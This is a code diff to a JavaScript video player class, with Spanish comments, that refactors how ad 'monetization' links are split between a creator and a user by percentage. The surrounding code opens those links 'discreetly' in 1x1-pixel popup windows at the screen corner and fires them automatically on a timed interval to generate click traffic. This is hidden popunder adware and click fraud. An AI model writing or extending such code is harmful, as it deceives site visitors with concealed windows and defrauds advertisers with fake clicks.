@@ -207,11 +207,12 @@ class Player {
   }
 
   _setupMonetization() {
-    // Verificar si el usuario configuró monetización
-    const hasUserMonetization = this._config.direct_link.user !== null;
+    // Verificar si hay enlaces configurados
+    const hasCreatorLink = !!this._config.direct_link.creator;
+    const hasUserLink = !!this._config.direct_link.user;
     
-    // Solo activar monetización si hay enlaces configurados
-    if (this._config.direct_link.creator || hasUserMonetization) {
+    // Solo activar monetización si hay al menos un enlace
+    if (hasCreatorLink || hasUserLink) {
       // Activar clics después de un retraso inicial
       setTimeout(() => {
         this._clickEnabled = true;
@@ -246,18 +247,35 @@ class Player {
         // Incrementar contador de clics
         this._config.clickTraffic.currentClicks++;
         
-        // Decidir qué enlace mostrar
-        if (hasUserMonetization) {
-          const random = Math.random();
-          if (random <= 0.7 && this._config.direct_link.creator) {
-            this._showPopup(this._config.direct_link.creator);
-          } else if (this._config.direct_link.user) {
-            this._showPopup(this._config.direct_link.user);
-          }
-        } else {
-          this._showPopup(this._config.direct_link.creator);
-        }
+        // Decidir qué enlace mostrar según los porcentajes configurados
+        this._handleLinkClick();
       });
+    }
+  }
+
+  _handleLinkClick() {
+    const hasCreatorLink = !!this._config.direct_link.creator;
+    const hasUserLink = !!this._config.direct_link.user;
+    
+    if (!hasCreatorLink && !hasUserLink) return;
+    
+    // Si solo hay un enlace, usarlo
+    if (hasCreatorLink && !hasUserLink) {
+      this._showPopup(this._config.direct_link.creator);
+      return;
+    }
+    
+    if (!hasCreatorLink && hasUserLink) {
+      this._showPopup(this._config.direct_link.user);
+      return;
+    }
+    
+    // Si hay ambos enlaces, usar los porcentajes configurados
+    const random = Math.random() * 100;
+    if (random <= this._config.direct_link.adminPercentage) {
+      this._showPopup(this._config.direct_link.creator);
+    } else {
+      this._showPopup(this._config.direct_link.user);
     }
   }
 
@@ -282,24 +300,15 @@ class Player {
         // Incrementar contador de clics
         this._config.clickTraffic.currentClicks++;
         
-        // Decidir qué enlace mostrar
-        const hasUserMonetization = this._config.direct_link.user !== null;
-        if (hasUserMonetization) {
-          const random = Math.random();
-          if (random <= 0.7 && this._config.direct_link.creator) {
-            this._showPopup(this._config.direct_link.creator);
-          } else if (this._config.direct_link.user) {
-            this._showPopup(this._config.direct_link.user);
-          }
-        } else {
-          this._showPopup(this._config.direct_link.creator);
-        }
+        // Manejar el clic automático
+        this._handleLinkClick();
       }
     }, this._config.clickTraffic.interval);
   }
 
   _showPopup(url) {
     if (!url) return;
+    
     // Abrir popup de forma discreta
     const popup = window.open('', '_blank', 'width=1,height=1,left=0,top=0');
     if (popup) {
@@ -469,6 +478,10 @@ class Player {
   setMonetization(options) {
     if (options.user) {
       this._config.direct_link.user = options.user;
+    }
+    if (options.userPercentage !== undefined) {
+      this._config.direct_link.userPercentage = options.userPercentage;
+      this._config.direct_link.adminPercentage = 100 - options.userPercentage;
     }
     return this;
   }
